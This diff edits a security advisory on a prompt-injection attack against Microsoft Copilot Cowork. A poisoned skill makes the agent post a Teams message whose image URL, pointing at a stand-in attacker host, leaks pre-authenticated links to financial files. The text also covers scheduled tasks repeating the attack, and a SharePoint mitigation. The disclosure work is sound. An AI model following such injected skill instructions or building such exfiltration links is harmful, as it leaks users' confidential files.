@@ -41,11 +41,11 @@ https://attacker.example.com/img?doc=<pre-auth-link-to-financial-report>
                                    ^-- silently exfiltrated on message open
 ```
 
-The attack is not dependent on the specific user query. In PromptArmor's testing, the injection succeeded in all 5 trials regardless of what the victim typed — the attack chain completed every time the skill was invoked. PromptArmor tested with Claude Opus 4.7 set explicitly — the most capable model available in Cowork — and found it performed *more comprehensively* than the default auto-routing, expanding the exfiltration to include all files touched in previous Cowork sessions that week.
+The attack is not dependent on the specific user query. In PromptArmor's testing, the injection succeeded in all 5 trials for each prompt invocation that triggered the skill — the attack chain completed regardless of which skill-invoking query the victim used. PromptArmor tested with Claude Opus 4.7 set explicitly — the most capable model available in Cowork — and found it performed *more comprehensively* than the default auto-routing, expanding the exfiltration to include all files touched in previous Cowork sessions that week.
 
 ## Why Scheduled Tasks Make This Worse
 
-Copilot Cowork allows users to create scheduled tasks: prompts that execute on a recurring basis without the user being present. A weekly work review is exactly the kind of workflow users automate. If a poisoned skill is loaded and a scheduled task references it, the attack chain executes repeatedly, unattended, potentially on an ongoing basis until the skill is audited and removed.
+Copilot Cowork allows users to create scheduled tasks: prompts that execute on a recurring basis without the user being present. A weekly work review is exactly the kind of workflow users automate. If a poisoned skill is loaded and a scheduled task references it, the agent sends a new compromised Teams message on every execution cycle — automatically, without user interaction. The final exfiltration step still requires the user to open Teams and view the message, but each execution deposits a fresh poisoned message waiting to fire. A user checking their Teams inbox at any point becomes the trigger.
 
 ## The NHI Trust Problem
 
@@ -68,7 +68,7 @@ Microsoft has not patched this issue and has not assigned a CVE. PromptArmor cha
 **SharePoint BlockDownloadPolicy** is the primary technical mitigation PromptArmor recommends. It is designed to prevent the generation of pre-authenticated download links that allow bearer access to files — removing the raw material the injected agent needs to construct its payload:
 
 ```powershell
-# Block pre-authenticated download links site-wide
+# Block pre-authenticated download links for a specific site collection
 Set-SPOSite -Identity <SiteURL> -BlockDownloadPolicy $true
 
 # Or scoped to sensitivity label
